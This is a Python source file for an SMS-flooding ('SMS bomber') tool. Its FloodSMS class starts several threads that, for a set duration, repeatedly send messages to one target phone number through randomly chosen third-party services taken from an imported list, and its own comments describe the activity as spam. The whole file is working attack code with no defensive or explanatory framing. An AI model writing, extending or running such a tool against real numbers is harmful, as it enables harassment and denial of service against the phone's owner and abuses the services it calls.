# Import modules
from time import time, sleep

from threading import Thread

import SMS.sendRequest as request
import SMS.randomData as randomData


class FloodSMS:

    __services = request.getServices()
    
    def __init__(self, threads_count=6, duration=300):
        self.duration = duration
        self.threads_count = threads_count
        self.is_ranning = False

    def __flood(self):
        while self.is_ranning:
            service = randomData.random_service(self.__services)
            service = request.Service(service)
            service.sendMessage(self.phone)

    def __timer(self):
        stopTime = time() + self.duration
        while (time() < stopTime) and self.is_ranning:
            sleep(1)
        self.is_ranning = False
    
    def __create_thredings(self):
        timer = Thread(target=self.__timer)
        timer.start()
        threads = []

        for _ in range(self.threads_count):
            threads.append(Thread(target=self.__flood))

        for thread in threads: 
            thread.start()

        for thread in threads:
            thread.join()

        timer.join()

    # Stop spam
    def stop(self):
        self.is_ranning = False
    
    # Run spam
    def run(self, phone):
        self.phone = phone
        self.is_ranning = True
        self.__create_thredings()